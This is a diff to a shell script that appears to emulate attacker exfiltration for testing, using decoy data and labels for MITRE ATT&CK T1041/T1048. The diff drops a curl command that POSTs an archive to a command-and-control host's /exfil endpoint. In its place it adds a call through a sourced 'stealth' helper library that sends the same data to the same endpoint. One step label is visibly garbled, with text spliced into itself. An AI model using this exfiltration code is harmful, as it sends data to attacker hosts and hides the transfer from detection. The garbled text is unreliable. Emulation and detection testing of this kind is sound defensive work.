@@ -14,6 +14,7 @@
 #   large single POST, non-business domain/port   (T1048 family)
 # ---------------------------------------------------------------------------
 set -u
+source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"
 
 HOME_DIR="${HOME:-/home/root}"
 DECOY_DIR="${DECOY_DIR:-${HOME_DIR}/decoy-data}"
@@ -40,9 +41,8 @@ fi
 say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)"
 
 step "exfiltrate archive via HTTP POST to control-api relay (ATTto control-api relay (ATT&CK T1041)CK T1041)"
-RESP="$(curl -s --max-time 10 -X POST --data-binary "@${ARCHIVE}" \
-    -H "Content-Type: application/octet-stream" \
-    "http://${C2_HOST}:${C2_PORT}/exfil")"
+st_mark T1041 "https-exfil"
+ST_HTTP_TIMEOUT=10 RESP="$(st_http POST "http://${C2_HOST}:${C2_PORT}/exfil" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
 say "C2 response: $RESP"
 
 step "Done — HTTPS-style exfil complete."
